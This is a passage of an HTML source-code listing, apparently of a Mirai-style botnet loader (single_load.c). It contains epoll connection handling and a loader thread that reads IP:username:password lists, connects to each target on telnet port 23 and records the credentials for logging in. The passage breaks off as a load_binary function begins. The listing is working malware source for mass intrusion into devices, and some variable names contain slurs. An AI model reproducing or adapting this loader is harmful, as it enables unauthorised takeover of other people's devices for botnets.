709</span>&#160;                pthread_mutex_unlock(&amp;state-&gt;<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00710"></a><span class="lineno">  710</span>&#160;                </div><div class="line"><a name="l00711"></a><span class="lineno">  711</span>&#160;                <span class="keywordflow">if</span> (!is_closed)</div><div class="line"><a name="l00712"></a><span class="lineno">  712</span>&#160;                {</div><div class="line"><a name="l00713"></a><span class="lineno">  713</span>&#160;                    <span class="keyword">struct </span>epoll_event event = {0};</div><div class="line"><a name="l00714"></a><span class="lineno">  714</span>&#160;                    <span class="keyword">event</span>.data.fd = state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>;</div><div class="line"><a name="l00715"></a><span class="lineno">  715</span>&#160;                    <span class="keyword">event</span>.events = EPOLLIN | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;</div><div class="line"><a name="l00716"></a><span class="lineno">  716</span>&#160;                    epoll_ctl(<a class="code" href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a>, EPOLL_CTL_MOD, state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, &amp;event);</div><div class="line"><a name="l00717"></a><span class="lineno">  717</span>&#160;                }</div><div class="line"><a name="l00718"></a><span class="lineno">  718</span>&#160;            } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(pevents[i].events &amp; EPOLLOUT)</div><div class="line"><a name="l00719"></a><span class="lineno">  719</span>&#160;            {   </div><div class="line"><a name="l00720"></a><span class="lineno">  720</span>&#160;                <span class="keyword">struct </span><a class="code" href="structstateSlot__t.html">stateSlot_t</a> *<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = &amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[pevents[i].data.fd];</div><div class="line"><a name="l00721"></a><span class="lineno">  721</span>&#160;                </div><div class="line"><a name="l00722"></a><span class="lineno">  722</span>&#160;                pthread_mutex_lock(&amp;state-&gt;<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00723"></a><span class="lineno">  723</span>&#160;                <span class="keywordflow">if</span>(state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 0)</div><div class="line"><a name="l00724"></a><span class="lineno">  724</span>&#160;                {</div><div class="line"><a name="l00725"></a><span class="lineno">  725</span>&#160;                    <span class="keywordtype">int</span> so_error = 0;</div><div class="line"><a name="l00726"></a><span class="lineno">  726</span>&#160;                    socklen_t len = <span class="keyword">sizeof</span>(so_error);</div><div class="line"><a name="l00727"></a><span class="lineno">  727</span>&#160;                    getsockopt(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, SOL_SOCKET, SO_ERROR, &amp;so_error, &amp;len);</div><div class="line"><a name="l00728"></a><span class="lineno">  728</span>&#160;                    <span class="keywordflow">if</span> (so_error) {  <a class="code" href="single__load_8c.html#aa3595475b02d25686ffadbcf19472db2">handle_failed_connect</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>); <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>); pthread_mutex_unlock(&amp;state-&gt;<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>); <span class="keywordflow">continue</span>; }</div><div class="line"><a name="l00729"></a><span class="lineno">  729</span>&#160;                    </div><div class="line"><a name="l00730"></a><span class="lineno">  730</span>&#160;                    state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 1;</div><div class="line"><a name="l00731"></a><span class="lineno">  731</span>&#160;                    </div><div class="line"><a name="l00732"></a><span class="lineno">  732</span>&#160;                    pevents[i].events = EPOLLIN | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;</div><div class="line"><a name="l00733"></a><span class="lineno">  733</span>&#160;                    epoll_ctl(<a class="code" href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a>, EPOLL_CTL_MOD, state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, &amp;pevents[i]);</div><div class="line"><a name="l00734"></a><span class="lineno">  734</span>&#160;                } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00735"></a><span class="lineno">  735</span>&#160;                    printf(<span class="stringliteral">&quot;wrong state on connect epoll: %d\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00736"></a><span class="lineno">  736</span>&#160;                    <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00737"></a><span class="lineno">  737</span>&#160;                }</div><div class="line"><a name="l00738"></a><span class="lineno">  738</span>&#160;                pthread_mutex_unlock(&amp;state-&gt;<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00739"></a><span class="lineno">  739</span>&#160;            }</div><div class="line"><a name="l00740"></a><span class="lineno">  740</span>&#160;        }</div><div class="line"><a name="l00741"></a><span class="lineno">  741</span>&#160;    }</div><div class="line"><a name="l00742"></a><span class="lineno">  742</span>&#160;</div><div class="line"><a name="l00743"></a><span class="lineno">  743</span>&#160;    __sync_fetch_and_sub(&amp;<a class="code" href="single__load_8c.html#acbdcadfc9f254fc3f06dc6ed0d39c3c6">running_threads</a>, 1);</div><div class="line"><a name="l00744"></a><span class="lineno">  744</span>&#160;</div><div class="line"><a name="l00745"></a><span class="lineno">  745</span>&#160;    <span class="keywordflow">return</span> NULL;</div><div class="line"><a name="l00746"></a><span class="lineno">  746</span>&#160;}</div><div class="line"><a name="l00747"></a><span class="lineno">  747</span>&#160;</div><div class="line"><a name="l00748"></a><span class="lineno"><a class="line" href="single__load_8c.html#abd382ad3c8079e6bd94332234d24f5a0">  748</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#abd382ad3c8079e6bd94332234d24f5a0">sighandler</a>(<span class="keywordtype">int</span> sig)</div><div class="line"><a name="l00749"></a><span class="lineno">  749</span>&#160;{</div><div class="line"><a name="l00750"></a><span class="lineno">  750</span>&#160;    printf(<span class="stringliteral">&quot;\nctrl-c\n&quot;</span>);</div><div class="line"><a name="l00751"></a><span class="lineno">  751</span>&#160;    exit(0);</div><div class="line"><a name="l00752"></a><span class="lineno">  752</span>&#160;}</div><div class="line"><a name="l00753"></a><span class="lineno">  753</span>&#160;</div><div class="line"><a name="l00754"></a><span class="lineno"><a class="line" href="single__load_8c.html#a66822609acc48ad7a36a4546881fe0ae">  754</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#a66822609acc48ad7a36a4546881fe0ae">chomp</a>(<span class="keywordtype">char</span> *s)</div><div class="line"><a name="l00755"></a><span class="lineno">  755</span>&#160;{</div><div class="line"><a name="l00756"></a><span class="lineno">  756</span>&#160;    <span class="keywordflow">while</span>(*s &amp;&amp; *s != <span class="charliteral">&#39;\n&#39;</span> &amp;&amp; *s != <span class="charliteral">&#39;\r&#39;</span>) s++;</div><div class="line"><a name="l00757"></a><span class="lineno">  757</span>&#160;    *s = 0;</div><div class="line"><a name="l00758"></a><span class="lineno">  758</span>&#160;}</div><div class="line"><a name="l00759"></a><span class="lineno">  759</span>&#160;</div><div class="line"><a name="l00760"></a><span class="lineno"><a class="line" href="single__load_8c.html#a73904daa97a0de0ca1ae5f82b172cf90">  760</a></span>&#160;<span class="keywordtype">void</span> *<a class="code" href="single__load_8c.html#a73904daa97a0de0ca1ae5f82b172cf90">loader</a>(<span class="keywordtype">void</span> *threadCount)</div><div class="line"><a name="l00761"></a><span class="lineno">  761</span>&#160;{</div><div class="line"><a name="l00762"></a><span class="lineno">  762</span>&#160;    <span class="keywordtype">char</span> readmelolfgt[1024], *hahgay;</div><div class="line"><a name="l00763"></a><span class="lineno">  763</span>&#160;    memset(readmelolfgt, 0, 1024);</div><div class="line"><a name="l00764"></a><span class="lineno">  764</span>&#160;</div><div class="line"><a name="l00765"></a><span class="lineno">  765</span>&#160;    <span class="keywordtype">char</span> *pch = NULL;</div><div class="line"><a name="l00766"></a><span class="lineno">  766</span>&#160;    <span class="keywordtype">char</span> *running, *orig, *token;</div><div class="line"><a name="l00767"></a><span class="lineno">  767</span>&#160;    <span class="keywordflow">while</span>(fgets(readmelolfgt, 1024, <a class="code" href="single__load_8c.html#ac891ccd192d22a97ec092f7d888237ab">infd</a>) != NULL)</div><div class="line"><a name="l00768"></a><span class="lineno">  768</span>&#160;    {</div><div class="line"><a name="l00769"></a><span class="lineno">  769</span>&#160;        <span class="keywordflow">while</span>(<a class="code" href="single__load_8c.html#a25b6b0d5a233ac0249fe798020e9d86a">getConnectedSockets</a>() &gt; (<a class="code" href="single__load_8c.html#a777a368ac9880f35191fd558c620c1ea">maxConnectedSockets</a> - 1))</div><div class="line"><a name="l00770"></a><span class="lineno">  770</span>&#160;        {</div><div class="line"><a name="l00771"></a><span class="lineno">  771</span>&#160;            <span class="keywordtype">int</span> curTime = time(NULL);</div><div class="line"><a name="l00772"></a><span class="lineno">  772</span>&#160;            <span class="keywordtype">int</span> q;</div><div class="line"><a name="l00773"></a><span class="lineno">  773</span>&#160;            <span class="keywordflow">for</span>(q = 0; q &lt; <a class="code" href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">maxFDSaw</a>; q++)</div><div class="line"><a name="l00774"></a><span class="lineno">  774</span>&#160;            {</div><div class="line"><a name="l00775"></a><span class="lineno">  775</span>&#160;                pthread_mutex_lock(&amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00776"></a><span class="lineno">  776</span>&#160;                <span class="keywordflow">if</span>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a> &amp;&amp; curTime &gt; (<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a88d3c42ff51a10be8140af96e823e79d">updatedAt</a> + 60) &amp;&amp; <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a41ba546ff5566fb42a81bf13f15476c9">reconnecting</a> == 0)</div><div class="line"><a name="l00777"></a><span class="lineno">  777</span>&#160;                {</div><div class="line"><a name="l00778"></a><span class="lineno">  778</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 0) <a class="code" href="single__load_8c.html#aa3595475b02d25686ffadbcf19472db2">handle_failed_connect</a>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00779"></a><span class="lineno">  779</span>&#160;                    <span class="keywordflow">else</span> <a class="code" href="single__load_8c.html#adb74e74784f00b371ac2b6174ee15593">handle_timeout</a>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].fd);</div><div class="line"><a name="l00780"></a><span class="lineno">  780</span>&#160;                    </div><div class="line"><a name="l00781"></a><span class="lineno">  781</span>&#160;                    <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].fd);</div><div class="line"><a name="l00782"></a><span class="lineno">  782</span>&#160;                }</div><div class="line"><a name="l00783"></a><span class="lineno">  783</span>&#160;                pthread_mutex_unlock(&amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].mutex);</div><div class="line"><a name="l00784"></a><span class="lineno">  784</span>&#160;            }</div><div class="line"><a name="l00785"></a><span class="lineno">  785</span>&#160;</div><div class="line"><a name="l00786"></a><span class="lineno">  786</span>&#160;            usleep(1000000);</div><div class="line"><a name="l00787"></a><span class="lineno">  787</span>&#160;        }</div><div class="line"><a name="l00788"></a><span class="lineno">  788</span>&#160;        running = orig = strdup(readmelolfgt);</div><div class="line"><a name="l00789"></a><span class="lineno">  789</span>&#160;</div><div class="line"><a name="l00790"></a><span class="lineno">  790</span>&#160;        token = strsep(&amp;running, <span class="stringliteral">&quot;:&quot;</span>);</div><div class="line"><a name="l00791"></a><span class="lineno">  791</span>&#160;        <span class="keywordflow">if</span>(token == NULL || inet_addr(token) == -1) { <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(orig); <span class="keywordflow">continue</span>; }</div><div class="line"><a name="l00792"></a><span class="lineno">  792</span>&#160;        <span class="keyword">struct </span>sockaddr_in dest_addr = {0};</div><div class="line"><a name="l00793"></a><span class="lineno">  793</span>&#160;        memset(&amp;dest_addr, 0, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00794"></a><span class="lineno">  794</span>&#160;        dest_addr.sin_family = AF_INET;</div><div class="line"><a name="l00795"></a><span class="lineno">  795</span>&#160;        dest_addr.sin_port = htons(23);</div><div class="line"><a name="l00796"></a><span class="lineno">  796</span>&#160;        dest_addr.sin_addr.s_addr = inet_addr(token);</div><div class="line"><a name="l00797"></a><span class="lineno">  797</span>&#160;        </div><div class="line"><a name="l00798"></a><span class="lineno">  798</span>&#160;        <span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a> = 0;</div><div class="line"><a name="l00799"></a><span class="lineno">  799</span>&#160;        <span class="keyword">struct </span>sockaddr_in my_addr = {0};</div><div class="line"><a name="l00800"></a><span class="lineno">  800</span>&#160;</div><div class="line"><a name="l00801"></a><span class="lineno">  801</span>&#160;        <span class="keywordflow">do</span></div><div class="line"><a name="l00802"></a><span class="lineno">  802</span>&#160;        {</div><div class="line"><a name="l00803"></a><span class="lineno">  803</span>&#160;            <span class="keywordflow">if</span> (errno != EBADF &amp;&amp; fd &gt; 0)</div><div class="line"><a name="l00804"></a><span class="lineno">  804</span>&#160;                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00805"></a><span class="lineno">  805</span>&#160;            </div><div class="line"><a name="l00806"></a><span class="lineno">  806</span>&#160;            fd = 0;</div><div class="line"><a name="l00807"></a><span class="lineno">  807</span>&#160;</div><div class="line"><a name="l00808"></a><span class="lineno">  808</span>&#160;            <span class="keywordflow">if</span>((fd=<a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_STREAM, IPPROTO_TCP))&lt;0)</div><div class="line"><a name="l00809"></a><span class="lineno">  809</span>&#160;            {</div><div class="line"><a name="l00810"></a><span class="lineno">  810</span>&#160;                perror(<span class="stringliteral">&quot;cant open socket&quot;</span>);</div><div class="line"><a name="l00811"></a><span class="lineno">  811</span>&#160;                exit(-1);</div><div class="line"><a name="l00812"></a><span class="lineno">  812</span>&#160;            }</div><div class="line"><a name="l00813"></a><span class="lineno">  813</span>&#160;            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, NULL) | O_NONBLOCK);</div><div class="line"><a name="l00814"></a><span class="lineno">  814</span>&#160;            <span class="keywordtype">int</span> flag = 1; </div><div class="line"><a name="l00815"></a><span class="lineno">  815</span>&#160;            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (<span class="keywordtype">char</span> *) &amp;flag, <span class="keyword">sizeof</span>(<span class="keywordtype">int</span>));</div><div class="line"><a name="l00816"></a><span class="lineno">  816</span>&#160;</div><div class="line"><a name="l00817"></a><span class="lineno">  817</span>&#160;            memset(&amp;my_addr, 0, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00818"></a><span class="lineno">  818</span>&#160;            my_addr.sin_addr.s_addr = inet_addr(<a class="code" href="single__load_8c.html#a40ea84f37bdd97a9380f0b0689cb9f6f">bind_ip</a>);</div><div class="line"><a name="l00819"></a><span class="lineno">  819</span>&#160;            my_addr.sin_port = htons(<a class="code" href="single__load_8c.html#ac7b080a6c9a6f86019eb3acd7c6ac075">port</a>++);</div><div class="line"><a name="l00820"></a><span class="lineno">  820</span>&#160;            my_addr.sin_family = AF_INET;</div><div class="line"><a name="l00821"></a><span class="lineno">  821</span>&#160;            errno = 0;</div><div class="line"><a name="l00822"></a><span class="lineno">  822</span>&#160;        } <span class="keywordflow">while</span>(bind(fd, (<span class="keyword">struct</span> sockaddr *)&amp;my_addr, <span class="keyword">sizeof</span>(my_addr)) != 0);</div><div class="line"><a name="l00823"></a><span class="lineno">  823</span>&#160;</div><div class="line"><a name="l00824"></a><span class="lineno">  824</span>&#160;        printf(<span class="stringliteral">&quot;bound\n&quot;</span>);</div><div class="line"><a name="l00825"></a><span class="lineno">  825</span>&#160;</div><div class="line"><a name="l00826"></a><span class="lineno">  826</span>&#160;        <span class="keywordtype">int</span> res = 0;</div><div class="line"><a name="l00827"></a><span class="lineno">  827</span>&#160;        res = <a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr));</div><div class="line"><a name="l00828"></a><span class="lineno">  828</span>&#160;        <span class="keywordflow">if</span>(res &lt; 0 &amp;&amp; errno != EINPROGRESS) { <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd); <span class="keywordflow">continue</span>; }</div><div class="line"><a name="l00829"></a><span class="lineno">  829</span>&#160;</div><div class="line"><a name="l00830"></a><span class="lineno">  830</span>&#160;        <span class="keywordflow">if</span>(fd &gt; <a class="code" href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">maxFDSaw</a>) <a class="code" href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">maxFDSaw</a> = fd + 1;</div><div class="line"><a name="l00831"></a><span class="lineno">  831</span>&#160;</div><div class="line"><a name="l00832"></a><span class="lineno">  832</span>&#160;        pthread_mutex_lock(&amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00833"></a><span class="lineno">  833</span>&#160;        <span class="keywordflow">if</span>(!<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a>)</div><div class="line"><a name="l00834"></a><span class="lineno">  834</span>&#160;        {</div><div class="line"><a name="l00835"></a><span class="lineno">  835</span>&#160;</div><div class="line"><a name="l00836"></a><span class="lineno">  836</span>&#160;            printf(<span class="stringliteral">&quot;memes\n&quot;</span>);</div><div class="line"><a name="l00837"></a><span class="lineno">  837</span>&#160;            <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a> = <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>;</div><div class="line"><a name="l00838"></a><span class="lineno">  838</span>&#160;            <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a88d3c42ff51a10be8140af96e823e79d">updatedAt</a> = time(NULL);</div><div class="line"><a name="l00839"></a><span class="lineno">  839</span>&#160;            <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a> = 1;</div><div class="line"><a name="l00840"></a><span class="lineno">  840</span>&#160;            <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 0;</div><div class="line"><a name="l00841"></a><span class="lineno">  841</span>&#160;            <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#ad68a66e6fda6e114a1075e5e7ae1e829">is_open</a> = 1;</div><div class="line"><a name="l00842"></a><span class="lineno">  842</span>&#160;            <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>].<a class="code" href="structstateSlot__t.html#af2928a0b0dd2a40d06b5f2294593274f">special</a> = 0;</div><div class="line"><a name="l00843"></a><span class="lineno">  843</span>&#160;            </div><div class="line"><a name="l00844"></a><span class="lineno">  844</span>&#160;            token = strsep(&amp;running, <span class="stringliteral">&quot;:&quot;</span>);</div><div class="line"><a name="l00845"></a><span class="lineno">  845</span>&#160;            strcpy(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].<a class="code" href="structstateSlot__t.html#a77d151d0f9c4e016ba16d3444e0d3553">username</a>, token);</div><div class="line"><a name="l00846"></a><span class="lineno">  846</span>&#160;            </div><div class="line"><a name="l00847"></a><span class="lineno">  847</span>&#160;            token = strsep(&amp;running, <span class="stringliteral">&quot;:&quot;</span>);</div><div class="line"><a name="l00848"></a><span class="lineno">  848</span>&#160;            strcpy(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].<a class="code" href="structstateSlot__t.html#a04cd8d776257013858dce1f54c7a0d74">password</a>, token);</div><div class="line"><a name="l00849"></a><span class="lineno">  849</span>&#160;        } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00850"></a><span class="lineno">  850</span>&#160;            printf(<span class="stringliteral">&quot;used slot found in loader thread?\n&quot;</span>);</div><div class="line"><a name="l00851"></a><span class="lineno">  851</span>&#160;        }</div><div class="line"><a name="l00852"></a><span class="lineno">  852</span>&#160;        pthread_mutex_unlock(&amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[fd].mutex);</div><div class="line"><a name="l00853"></a><span class="lineno">  853</span>&#160;</div><div class="line"><a name="l00854"></a><span class="lineno">  854</span>&#160;        <span class="keyword">struct </span>epoll_event event = {0};</div><div class="line"><a name="l00855"></a><span class="lineno">  855</span>&#160;        <span class="keyword">event</span>.data.fd = <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>;</div><div class="line"><a name="l00856"></a><span class="lineno">  856</span>&#160;        <span class="keyword">event</span>.events = EPOLLOUT | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;</div><div class="line"><a name="l00857"></a><span class="lineno">  857</span>&#160;        epoll_ctl(<a class="code" href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a>, EPOLL_CTL_ADD, fd, &amp;event);</div><div class="line"><a name="l00858"></a><span class="lineno">  858</span>&#160;        </div><div class="line"><a name="l00859"></a><span class="lineno">  859</span>&#160;        <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(orig);</div><div class="line"><a name="l00860"></a><span class="lineno">  860</span>&#160;    }</div><div class="line"><a name="l00861"></a><span class="lineno">  861</span>&#160;    </div><div class="line"><a name="l00862"></a><span class="lineno">  862</span>&#160;    printf(<span class="stringliteral">&quot;done reading input file.\n&quot;</span>);</div><div class="line"><a name="l00863"></a><span class="lineno">  863</span>&#160;</div><div class="line"><a name="l00864"></a><span class="lineno">  864</span>&#160;    <span class="keywordflow">while</span>(1)</div><div class="line"><a name="l00865"></a><span class="lineno">  865</span>&#160;    {</div><div class="line"><a name="l00866"></a><span class="lineno">  866</span>&#160;        <span class="keywordtype">int</span> curTime = time(NULL);</div><div class="line"><a name="l00867"></a><span class="lineno">  867</span>&#160;        <span class="keywordtype">int</span> q;</div><div class="line"><a name="l00868"></a><span class="lineno">  868</span>&#160;        <span class="keywordflow">for</span>(q = 0; q &lt; <a class="code" href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">maxFDSaw</a>; q++)</div><div class="line"><a name="l00869"></a><span class="lineno">  869</span>&#160;        {</div><div class="line"><a name="l00870"></a><span class="lineno">  870</span>&#160;            pthread_mutex_lock(&amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00871"></a><span class="lineno">  871</span>&#160;            <span class="keywordflow">if</span>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a> &amp;&amp; curTime &gt; (<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a88d3c42ff51a10be8140af96e823e79d">updatedAt</a> + 60) &amp;&amp; <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a41ba546ff5566fb42a81bf13f15476c9">reconnecting</a> == 0)</div><div class="line"><a name="l00872"></a><span class="lineno">  872</span>&#160;            {</div><div class="line"><a name="l00873"></a><span class="lineno">  873</span>&#160;                <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 0) <a class="code" href="single__load_8c.html#aa3595475b02d25686ffadbcf19472db2">handle_failed_connect</a>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00874"></a><span class="lineno">  874</span>&#160;                <span class="keywordflow">else</span> <a class="code" href="single__load_8c.html#adb74e74784f00b371ac2b6174ee15593">handle_timeout</a>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].fd);</div><div class="line"><a name="l00875"></a><span class="lineno">  875</span>&#160;                </div><div class="line"><a name="l00876"></a><span class="lineno">  876</span>&#160;                <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].fd);</div><div class="line"><a name="l00877"></a><span class="lineno">  877</span>&#160;            }</div><div class="line"><a name="l00878"></a><span class="lineno">  878</span>&#160;            pthread_mutex_unlock(&amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[q].mutex);</div><div class="line"><a name="l00879"></a><span class="lineno">  879</span>&#160;        }</div><div class="line"><a name="l00880"></a><span class="lineno">  880</span>&#160;</div><div class="line"><a name="l00881"></a><span class="lineno">  881</span>&#160;        sleep(1);</div><div class="line"><a name="l00882"></a><span class="lineno">  882</span>&#160;    }</div><div class="line"><a name="l00883"></a><span class="lineno">  883</span>&#160;</div><div class="line"><a name="l00884"></a><span class="lineno">  884</span>&#160;    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(<a class="code" href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a>);</div><div class="line"><a name="l00885"></a><span class="lineno">  885</span>&#160;}</div><div class="line"><a name="l00886"></a><span class="lineno">  886</span>&#160;</div><div class="line"><a name="l00887"></a><span class="lineno"><a class="line" href="single__load_8c.html#a1ddc36888fe0a695203e39b20b1f5b2c">  887</a></span>&#160;<span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a1ddc36888fe0a695203e39b20b1f5b2c">load_binary</a>(<span class="keywordtype">char</span> *<a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>)</div><div 